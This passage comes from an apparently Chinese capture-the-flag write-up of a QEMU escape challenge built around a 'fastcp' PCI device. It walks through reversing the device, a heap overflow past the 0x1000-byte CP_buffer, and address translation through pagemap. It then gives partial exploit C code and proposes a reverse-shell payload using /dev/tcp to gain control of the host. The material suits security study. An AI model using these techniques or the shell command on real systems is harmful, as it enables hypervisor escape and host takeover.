<span id="cb9-27"><a href="#cb9-27" aria-hidden="true"></a>      <span class="st">&quot;fastcp-mmio&quot;</span>,</span>
<span id="cb9-28"><a href="#cb9-28" aria-hidden="true"></a>      (<span class="dt">uint64_t</span>)&amp;stru_100000);</span>
<span id="cb9-29"><a href="#cb9-29" aria-hidden="true"></a>    pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free);</span>
<span id="cb9-30"><a href="#cb9-30" aria-hidden="true"></a>    HIDWORD(v2[<span class="dv">63</span>].parent) = <span class="dv">0</span>;</span>
<span id="cb9-31"><a href="#cb9-31" aria-hidden="true"></a>  }</span>
<span id="cb9-32"><a href="#cb9-32" aria-hidden="true"></a>}</span></code></pre></div>
<p>主要有mmio操作和cp_timer操作</p>
<p>接下来分析mmio_read操作</p>
<p><img src="https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png" /></p>
<p>可以看到如果size==8 ，根据addr的不同返回不同的数据，</p>
<ul>
<li>功能0x08 返回opaque-&gt;cp_state.CP_list_src</li>
<li>功能0x10 返回opaque-&gt;cp_state.CP_list_cnt</li>
<li>功能0x18 返回opaque-&gt;cp_state.cmd3</li>
</ul>
<p>其中为了控制size==0需要设置addr为<code>uint64_t</code>类型</p>
<p>接下来分析mmio_write</p>
<p><img src="https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png" /></p>
<p>当addr==24的时候不仅设置cmd，还触发时钟函数<code>timer_mod</code></p>
<p>之后分析<code>fastcp_cp_timer</code>函数</p>
<p><img src="https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png" /></p>
<p>timer函数根据传入的参数cmd来选择执行的分支</p>
<p><img src="https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png" /></p>
<p>其中<code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)</code></p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>                            hwaddr len, <span class="dt">bool</span> is_write);</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>                                            <span class="dt">void</span> *buf, hwaddr len)</span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>{</span>
<span id="cb10-6"><a href="#cb10-6" aria-hidden="true"></a>    cpu_physical_memory_rw(addr, buf, len, false);</span>
<span id="cb10-7"><a href="#cb10-7" aria-hidden="true"></a>}</span>
<span id="cb10-8"><a href="#cb10-8" aria-hidden="true"></a><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</span>
<span id="cb10-9"><a href="#cb10-9" aria-hidden="true"></a>                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</span>
<span id="cb10-10"><a href="#cb10-10" aria-hidden="true"></a>{</span>
<span id="cb10-11"><a href="#cb10-11" aria-hidden="true"></a>    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</span>
<span id="cb10-12"><a href="#cb10-12" aria-hidden="true"></a>}</span></code></pre></div>
<p>如果<code>opaque-&gt;cp_state.CP_list_cnt</code>大小大于<code>0x10</code>，则会根据<code>cp_state.CP_list_cnt</code>的大小循环从<code>opaque-&gt;cp_state.CP_list_src</code>读取结构体到<code>cp_info</code>，然后依次将<code>CP_src</code>中的数据写入到<code>CP_buffer</code>，然后从<code>CP_buffer</code>中读取数据到<code>CP_dst</code>，长度由<code>CP_cnt</code>指定。</p>
<p>漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）</p>
<pre><code>00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
00000000 pdev PCIDevice_0 ?
000008F0 mmio MemoryRegion_0 ?
000009E0 cp_state CP_state ?
000009F8 handling db ?
000009F9 db ? ; undefined
000009FA db ? ; undefined
000009FB db ? ; undefined
000009FC irq_status dd ?
00000A00 CP_buffer db 4096 dup(?)
00001A00 cp_timer QEMUTimer_0 ?
00001A30 FastCPState ends</code></pre>
<p>可以看出CP_buffer只有0x1000字节。</p>
<h3 id="物理地址转换">2. 物理地址转换</h3>
<p>通过<code>pagemap</code>将虚拟机中的虚拟地址转换为物理地址。</p>
<p>根据内核文档可知，每个虚拟页在<code>/proc/pid/pagemap</code>中对应一项长度为<code>64 bits</code>的数据，其中<code>Bit 63</code>为<code>page present</code>，表示物理内存页是否已存在；若物理页已存在，则<code>Bits 0-54</code>表示物理页号，此外，需要<code>root</code>权限的进程才能读取<code>/proc/pid/pagemap</code>中的内容。</p>
<pre><code>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</code></pre>
<p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p>
<p>2、 读取长度为<code>64bits</code>的数据项</p>
<p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p>
<p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p>
<p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p>
<p>对应代码如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span><span class="pp">   </span></span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true"></a></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true"></a><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</span>
<span id="cb13-14"><a href="#cb13-14" aria-hidden="true"></a>    <span class="dt">uint64_t</span> data;</span>
<span id="cb13-15"><a href="#cb13-15" aria-hidden="true"></a></span>
<span id="cb13-16"><a href="#cb13-16" aria-hidden="true"></a>    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</span>
<span id="cb13-17"><a href="#cb13-17" aria-hidden="true"></a>    <span class="cf">if</span>(!fd){</span>
<span id="cb13-18"><a href="#cb13-18" aria-hidden="true"></a>        perror(<span class="st">&quot;open pagemap&quot;</span>);</span>
<span id="cb13-19"><a href="#cb13-19" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb13-20"><a href="#cb13-20" aria-hidden="true"></a>    }</span>
<span id="cb13-21"><a href="#cb13-21" aria-hidden="true"></a></span>
<span id="cb13-22"><a href="#cb13-22" aria-hidden="true"></a>    <span class="dt">size_t</span> pagesize = getpagesize();</span>
<span id="cb13-23"><a href="#cb13-23" aria-hidden="true"></a>    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</span>
<span id="cb13-24"><a href="#cb13-24" aria-hidden="true"></a></span>
<span id="cb13-25"><a href="#cb13-25" aria-hidden="true"></a>    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</span>
<span id="cb13-26"><a href="#cb13-26" aria-hidden="true"></a>        puts(<span class="st">&quot;lseek&quot;</span>);</span>
<span id="cb13-27"><a href="#cb13-27" aria-hidden="true"></a>        close(fd);</span>
<span id="cb13-28"><a href="#cb13-28" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb13-29"><a href="#cb13-29" aria-hidden="true"></a>    }</span>
<span id="cb13-30"><a href="#cb13-30" aria-hidden="true"></a></span>
<span id="cb13-31"><a href="#cb13-31" aria-hidden="true"></a>    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</span>
<span id="cb13-32"><a href="#cb13-32" aria-hidden="true"></a>        puts(<span class="st">&quot;read&quot;</span>);</span>
<span id="cb13-33"><a href="#cb13-33" aria-hidden="true"></a>        close(fd);</span>
<span id="cb13-34"><a href="#cb13-34" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb13-35"><a href="#cb13-35" aria-hidden="true"></a>    }</span>
<span id="cb13-36"><a href="#cb13-36" aria-hidden="true"></a></span>
<span id="cb13-37"><a href="#cb13-37" aria-hidden="true"></a>    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</span>
<span id="cb13-38"><a href="#cb13-38" aria-hidden="true"></a>        puts(<span class="st">&quot;page&quot;</span>);</span>
<span id="cb13-39"><a href="#cb13-39" aria-hidden="true"></a>        close(fd);</span>
<span id="cb13-40"><a href="#cb13-40" aria-hidden="true"></a>        <span class="cf">return</span> <span class="dv">0</span>;</span>
<span id="cb13-41"><a href="#cb13-41" aria-hidden="true"></a>    }</span>
<span id="cb13-42"><a href="#cb13-42" aria-hidden="true"></a></span>
<span id="cb13-43"><a href="#cb13-43" aria-hidden="true"></a>    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</span>
<span id="cb13-44"><a href="#cb13-44" aria-hidden="true"></a>    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</span>
<span id="cb13-45"><a href="#cb13-45" aria-hidden="true"></a></span>
<span id="cb13-46"><a href="#cb13-46" aria-hidden="true"></a>    close(fd);</span>
<span id="cb13-47"><a href="#cb13-47" aria-hidden="true"></a></span>
<span id="cb13-48"><a href="#cb13-48" aria-hidden="true"></a>    <span class="cf">return</span> phyaddr;</span>
<span id="cb13-49"><a href="#cb13-49" aria-hidden="true"></a>}</span>
<span id="cb13-50"><a href="#cb13-50" aria-hidden="true"></a></span>
<span id="cb13-51"><a href="#cb13-51" aria-hidden="true"></a><span class="dt">int</span> main(){</span>
<span id="cb13-52"><a href="#cb13-52" aria-hidden="true"></a>    <span class="dt">char</span> *userbuf;</span>
<span id="cb13-53"><a href="#cb13-53" aria-hidden="true"></a>    <span class="dt">uint64_t</span> userbuf_pa;</span>
<span id="cb13-54"><a href="#cb13-54" aria-hidden="true"></a>    <span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</span>
<span id="cb13-55"><a href="#cb13-55" aria-hidden="true"></a></span>
<span id="cb13-56"><a href="#cb13-56" aria-hidden="true"></a>    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span>
<span id="cb13-57"><a href="#cb13-57" aria-hidden="true"></a>    <span class="cf">if</span> (mmio_fd == -<span class="dv">1</span>){</span>
<span id="cb13-58"><a href="#cb13-58" aria-hidden="true"></a>        perror(<span class="st">&quot;open mmio&quot;</span>);</span>
<span id="cb13-59"><a href="#cb13-59" aria-hidden="true"></a>        exit(-<span class="dv">1</span>);</span>
<span id="cb13-60"><a href="#cb13-60" aria-hidden="true"></a>    }</span>
<span id="cb13-61"><a href="#cb13-61" aria-hidden="true"></a></span>
<span id="cb13-62"><a href="#cb13-62" aria-hidden="true"></a>    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</span>
<span id="cb13-63"><a href="#cb13-63" aria-hidden="true"></a>    <span class="cf">if</span> (mmio_mem == MAP_FAILED){</span>
<span id="cb13-64"><a href="#cb13-64" aria-hidden="true"></a>        perror(<span class="st">&quot;mmap mmio&quot;</span>);</span>
<span id="cb13-65"><a href="#cb13-65" aria-hidden="true"></a>        exit(-<span class="dv">1</span>);</span>
<span id="cb13-66"><a href="#cb13-66" aria-hidden="true"></a>    }</span>
<span id="cb13-67"><a href="#cb13-67" aria-hidden="true"></a></span>
<span id="cb13-68"><a href="#cb13-68" aria-hidden="true"></a>    printf(<span class="st">&quot;mmio_mem:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>, mmio_mem);</span>
<span id="cb13-69"><a href="#cb13-69" aria-hidden="true"></a></span>
<span id="cb13-70"><a href="#cb13-70" aria-hidden="true"></a>    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</span>
<span id="cb13-71"><a href="#cb13-71" aria-hidden="true"></a>    <span class="cf">if</span> (userbuf == MAP_FAILED){</span>
<span id="cb13-72"><a href="#cb13-72" aria-hidden="true"></a>        perror(<span class="st">&quot;mmap userbuf&quot;</span>);</span>
<span id="cb13-73"><a href="#cb13-73" aria-hidden="true"></a>        exit(-<span class="dv">1</span>);</span>
<span id="cb13-74"><a href="#cb13-74" aria-hidden="true"></a>    }</span>
<span id="cb13-75"><a href="#cb13-75" aria-hidden="true"></a></span>
<span id="cb13-76"><a href="#cb13-76" aria-hidden="true"></a>    strcpy(userbuf,<span class="st">&quot;test&quot;</span>);</span>
<span id="cb13-77"><a href="#cb13-77" aria-hidden="true"></a></span>
<span id="cb13-78"><a href="#cb13-78" aria-hidden="true"></a>    mlock(userbuf, <span class="bn">0x1000</span>);</span>
<span id="cb13-79"><a href="#cb13-79" aria-hidden="true"></a>    userbuf_pa = va2pa(userbuf);</span>
<span id="cb13-80"><a href="#cb13-80" aria-hidden="true"></a></span>
<span id="cb13-81"><a href="#cb13-81" aria-hidden="true"></a>    printf(<span class="st">&quot;userbuf_va:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</span>
<span id="cb13-82"><a href="#cb13-82" aria-hidden="true"></a>    printf(<span class="st">&quot;userbuf_pa:</span><span class="sc">\t</span><span class="st">%p</span><span class="sc">\n</span><span class="st">&quot;</span>,(<span class="dt">void</span> *)userbuf_pa);</span>
<span id="cb13-83"><a href="#cb13-83" aria-hidden="true"></a>}</span></code></pre></div>
<h3 id="漏洞利用-1">3. 漏洞利用</h3>
<ul>
<li>通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system@plt 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。</li>
<li>通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流</li>
</ul>
<p>触发时钟可以利用两种方式：</p>
<ul>
<li>虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)</li>
<li>在 MMOI WRITE 中可以触发时钟</li>
</ul>
<p>system 执行内容：</p>
<ul>
<li>cat /flag</li>
<li>反弹 shell，/bin/bash -c ‘bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。</li>
<li>弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。</li>
</ul>
<p>注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap 申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000 的物理地址复制），需要额外的注意。</p>
<h3 id="exploit-1">4. Exploit</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb14-8"><a href="#cb14-8" aria-hidden="true"></a><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></span>
<span id="cb14-9"><a href="#cb14-9" aria-hidden="true"></a></span>
<span id="cb14-10"><a href="#cb14-10" aria-hidden="true"></a><span class="pp">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span></span>
<span id="cb14-11"><a href="#cb14-11" aria-hidden="true"></a><span class="pp">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span></span>
<span id="cb14-12"><a href="#cb14-12" aria-hidden="true"></a></span>
<span id="cb14-13"><a href="#cb14-13" aria-hidden="true"></a><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</span>
<span id="cb14-14"><a href="#cb14-14" aria-hidden="true"></a><span class="dt">uint64_t</span> phy_userbuf;</span>
<span id="cb14-15"><a href="#cb14-15" aria-hidden="true"></a><span class="dt">char</span> *userbuf;</span>
<span id="cb14-16"><a href="#cb14-16" aria-hidden="true"></a><span class="dt">uint64_t</span> phy_userbuf1;</span>
<span id="cb14-17"><a href="#cb14-17" aria-hidden="true"></a><span class="dt">uint64_t</span> phy_buf0;</span>
<span id="cb14-18"><a href="#cb14-18" aria-hidden="true"></a><span class="dt">char</span> *userbuf1;</span>
<span id="cb14-19"><a href="#cb14-19" aria-hidden="true"></a><span class="dt">int</span> fd;</span>
<span id="cb14-20"><a href="#cb14-20" aria-hidden="true"></a><span class="dt">void</span> Err(<span class="dt">char</span>* err){</span>
<span id="cb14-21"><a href="#cb14-21" aria-hidden="true"></a>    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>, err);</span>
<span id="cb14-22"><a href="#cb14-22" aria-hidden="true"></a>    exit(-<span class="dv">1</span>);</span>
<span id="cb14-23"><a href="#cb14-23" aria-hidden="true"></a>}</span>
<span id="cb14-24"><a href="#cb14-24" aria-hidden="true"></a></span>
<span id="cb14-25"><a href="#cb14-25" aria-hidden="true"></a><span class="dt">void</span> init_mmio(){</span>
<span id="cb14-26"><a href="#cb14-26" aria-hidden="true"></a>    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span>
<span id="cb14-27"><a href="#cb14-27" aria-hidden="true"></a>    <span class="cf">if</span>(mmio_fd &lt; <span class="dv">0</span>){</span>
<span id="cb14-28"><a href="#cb14-28" aria-hidden="true"></a>        Err(<span class="st">&quot;Open pci&quot;</span>);</span>
<span id="cb14-29"><a href="#cb14-29" aria-hidden="true"></a>    }</span>
<span id="cb14-30"><a href="#cb14-30" aria-hidden="true"></a>    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</span>
<span id="cb14-31"><a href="#cb14-31" aria-hidden="true"></a>    <span class="cf">if</span>(mmio_mem&lt;<span class="dv">0</span>){</span>
<span id="cb14-32"><a href="#cb14-32" aria-hidden="true"></a>        Err(<span class="st">&quot;mmap mmio_mem&quot;</span>);</span>
<span id="cb14-33"><a href="#cb14-33" aria-hidden="true"></a>    }</span>
<span id="cb14-34"><a href="#cb14-34" aria-hidden="true"></a>}</span>
<span id="cb14-35"><a href="#cb14-35" aria-hidden="true"></a></span>
<span id="cb14-36"><a href="#cb14-36" aria-hidden="true"></a><span class="dt">void</span> mmio_write(<span class="dt">uint64_t</span> addr, <span class="dt">uint64_t</span> value){</span>
<span id="cb14-37"><a href="#cb14-37" aria-hidden="true"></a>    *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)) = value;</span>
<span id="cb14-38"><a href="#cb14-38" aria-hidden="true"></a>}</span>
<span id="cb14-39"><a href="#cb14-39" aria-hidden="true"></a></span>
<span id="cb14-40"><a href="#cb14-40" aria-hidden="true"></a><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</span>
<span id="cb14-41"><a href="#cb14-41" aria-hidden="true"></a>    <span class="cf">return</span> *((<span class="dt">uint64_t</span>*)(mmio_mem+addr)); </span>
<span id="cb14-42"><a href="#cb14-42" aria-hidden="true"></a>}</span>
<span id="cb14-43"><a href="#cb14-43" aria-hidden="true"></a></span>
<span id="cb14-44"><a href="#cb14-44" aria-hidden="true"></a><span class="dt">void</span> set_list_cnt(<span class="dt">uint64_t</span> cnt){</span>
<span id="cb14-45"><a href="#cb14-45" aria-hidden="true"></a>    mmio_write(<span class="bn">0x10</span>, cnt);</span>
<span id="cb14-46"><a href="#cb14-46" aria-hidden="true"></a>}</span>
<span id="cb14-47"><a href="#cb14-47" aria-hidden="true"></a></span>
<span id="cb14-48"><a href="#cb14-48" aria-hidden="true"></a><span class="dt">void</span> set_src(<span class="dt">uint64_t</span> src){</span>
<span id="cb14-49"><a href="#cb14-49" aria-hidden="true"></a>    mmio_write(<span class="bn">0x8</span>, src);</span>
<span id="cb14-50"><a href="#cb14-50" aria-hidden="true"></a>}</span>
<span id="cb14-51"><a href="#cb14-51" aria-hidden="true"></a></span>
<span id="cb14-52"><a href="#cb14-52" aria-hidden="true"></a><span class="dt">void</span> set_cmd(<span class="dt">uint64_t</span> cmd){</span>
<span id="cb14-53"><a href="#cb14-53" aria-hidden="true"></a>    mmio_write(<span class="bn">0x18</span>, cmd);</span>
<span id="cb14-54"><a href="#cb14-54" aria-hidden="true"></a>}</span>
<span id="cb14-55"><a href="#cb14-55" aria-hidden="true"></a></span>
<span id="cb14-56"><a href="#cb14-56" aria-hidden="true"></a><span class="dt">void</span> set_read(<span class="dt">uint64_t</span> cnt){</span>
<span id="cb14-57"><a href="#cb14-57" aria-hidden="true"></a>    set_src(phy_userbuf);</span>
<span id="cb14-58"><a href="#cb14-58" aria-hidden="true"></a>    set_list_cnt(cnt);</span>
<span id="cb14-59"><a href="#cb14-59" aria-hidden="true"></a></span>
<span id="cb14-60"><a href="#cb14-60" aria-hidden="true"></a>    set_cmd(<span class="bn">0x4</span>);</span>
<span id="cb14-61"><a href="#cb14-61" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb14-62"><a href="#cb14-62" aria-hidden="true"></a>}</span>
<span id="cb14-63"><a href="#cb14-63" aria-hidden="true"></a></span>
<span id="cb14-64"><a href="#cb14-64" aria-hidden="true"></a><span class="dt">void</span> set_write(<span class="dt">uint64_t</span> cnt){</span>
<span id="cb14-65"><a href="#cb14-65" aria-hidden="true"></a>    set_src(phy_userbuf);</span>
<span id="cb14-66"><a href="#cb14-66" aria-hidden="true"></a>    set_list_cnt(cnt);</span>
<span id="cb14-67"><a href="#cb14-67" aria-hidden="true"></a></span>
<span id="cb14-68"><a href="#cb14-68" aria-hidden="true"></a>    set_cmd(<span class="bn">0x2</span>);</span>
<span id="cb14-69"><a href="#cb14-69" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb14-70"><a href="#cb14-70" aria-hidden="true"></a>}</span>
<span id="cb14-71"><a href="#cb14-71" aria-hidden="true"></a></span>
<span id="cb14-72"><a href="#cb14-72" aria-hidden="true"></a><span class="dt">void</span> set_read_write(<span class="dt">uint64_t</span> cnt){</span>
<span id="cb14-73"><a href="#cb14-73" aria-hidden="true"></a>    set_src(phy_userbuf);</span>
<span id="cb14-74"><a href="#cb14-74" aria-hidden="true"></a>    set_list_cnt(cnt);</span>
<span id="cb14-75"><a href="#cb14-75" aria-hidden="true"></a></span>
<span id="cb14-76"><a href="#cb14-76" aria-hidden="true"></a>    set_cmd(<span class="bn">0x1</span>);</span>
<span id="cb14-77"><a href="#cb14-77" aria-hidden="true"></a>    sleep(<span class="dv">1</span>);</span>
<span id="cb14-78"><a href="#cb14-78" aria-hidden="true"></a>}</span>
<span id="cb14-79"><a href="#cb14-79" aria-hidden="true"></a></span>
<span id="cb14-80"><a href="#cb14-80" aria-hidden="true"></a><span class="pp">#define PAGE_SHIFT 12</span></span>
<span id="cb14-81"><a href="#cb14-81" aria-hidden="true"></a><span class="pp">#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span>
<span id="cb14-82"><a href="#cb14-82" aria-hidden="true"></a><span class="pp">#define PFN_PRESENT (1ull &lt;&lt; 63)</span></span>
<span id="cb14-83"><a href="#cb14-83" aria-hidden="true"></a><span class="pp">#define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span>
<span id="cb14-84"><a href="#cb14-84" aria-hidden="true"></a><span class="dt">int</span> fd;</span>
<span id="cb14-85"><a href="#cb14-85" aria-hidden="true"></a><span class="dt">uint32_t</span> page_offset(<span class="dt">uint32_t</span> addr)</span>
<span id="cb14-86"><a href="#cb14-86" aria-hidden="true"></a>{</span>
<span id="cb14-87"><a href="#cb14-87" aria-hidden="true"></a>    <span class="cf">return</span> addr &amp; ((<span class="dv">1</span> &lt;&lt; PAGE_SHIFT) - <span class="dv">1</span>);</span>
<span id="cb14-88"><a href="#cb14-88" aria-hidden="true"></a>}</span>
<span id="cb14-89"><a href="#cb14-89" aria-hidden="true"></a></span>
<span id="cb14-90"><a href="#cb14-90" aria-hidden="true"></a><span class="dt">uint64_t</span> gva_to_gfn(<span class="dt">void</span> *addr)</span>
<span id="cb14-91"><a href="#cb14-91" aria-hidden="true"></a>{</span>
<span id="cb14-92"><a href="#cb14-92" aria-hidden="true"></a>    <span class="dt">uint64_t</span> pme, gfn;</span>
<span id="cb14-93"><a href="#cb14-93" aria-hidden="true"></a>    <span class="dt">size_t</span> offset;</span>
<span id="cb14-94"><a href="#cb14-94" aria-hidden="true"></a>    offset = ((<span class="dt">uintptr_t</span>)addr &gt;&gt; <span class="dv">9</span>) &amp; ~<span class="dv">7</span>;</span>
<span id="cb14-95"><a href="#cb14-95" aria-hidden="true"></a>    <span class="co">// ((uintptr_t)addr &gt;&gt; 12)&lt;&lt;3</span></span>
<span id="cb14-96"><a href="#cb14-96" aria-hidden="true"></a>    lseek(fd, offset, SEEK_SET);</span>
<span id="cb14-97"><a href="#cb14-97" aria-hidden="true"></a>    read(fd, &amp;pme, <span class="dv">8</span>);</span>
<span id="cb14-98"><a href="#cb14-98" aria-hidden="true"></a>    <span class="cf">if</span> (!(pme &amp; PFN_PRESENT))</span>
<span id="cb14-99"><a href="#cb14-99" aria-hidden="true"></a>        <span class="cf">return</span> -<span class="dv">1</span>;</span>
<span id="cb14-100"><a href="#cb14-100" aria-hidden="true"></a>    gfn = pme &amp; PFN_PFN;</span>
